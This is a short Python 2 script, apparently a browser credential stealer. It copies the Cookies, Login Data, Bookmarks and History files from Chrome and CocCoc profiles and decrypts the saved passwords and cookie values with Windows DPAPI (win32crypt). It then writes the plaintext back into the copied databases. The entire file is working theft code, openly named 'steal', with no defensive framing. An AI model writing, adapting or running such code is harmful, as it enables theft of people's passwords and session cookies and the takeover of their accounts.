import os
import sqlite3
import win32crypt
import sys
import shutil
save="steal/"

def steal(path,tab,col_enc):
	try:
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
	except:
		return
	
	try:
		query='PRAGMA table_info({})'.format(tab)
		cursor.execute(query)
	except Exception, e:
		print '[-] %s' % (e)
		sys.exit(1)

	data = cursor.fetchall()
	col=[]
	for result in data:
		col.append(result[1])
	
	query='select {COL1},{COL2} from {TAB}'.format(COL1=col[0],COL2=','.join(col_enc),TAB=tab)
	cursor.execute(query)
	data = cursor.fetchall()
	for result in data:
		text=[]
		for i in range(1,len(result)):
			try:
				temp=win32crypt.CryptUnprotectData(result[i], None, None, None, 0)[1]
			except:
				print path,tab
				exit()
			text.append(temp)
		update=""
		for i in range(0,len(col_enc)):
			update+=col_enc[i]+"="+"'"+text[i]+"'"
		query="UPDATE {TAB} SET {UPDATE} WHERE {COL1}='{VAL}';".format(TAB=tab,UPDATE=update,COL1=col[0],VAL=result[0])
		cursor.execute(query)
	conn.commit()
	conn.close()

file={"Cookies":["cookies",["encrypted_value"]],"Bookmarks":"","Login Data":["logins",["password_value"]],"History":""}
browser={"chrome":"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\",
"coccoc":"\\AppData\\Local\\CocCoc\\Browser\\User Data\\Default\\"}
user = os.getenv('USERPROFILE')

for br in browser:
	if os.path.isdir(user+browser[br])==True:
		path=user+browser[br]
		for i in file:
			try:
				shutil.copy(path+i, br+"."+i)
			except:
				continue
			#os.system('copy "{SRC}" "{DST}"'.format(SRC=path+i,DST=i))
			if len(file[i])==0:
				#copy
				continue
			for j in range(1,len(file[i])):
				steal(br+"."+i,file[i][0],file[i][1])
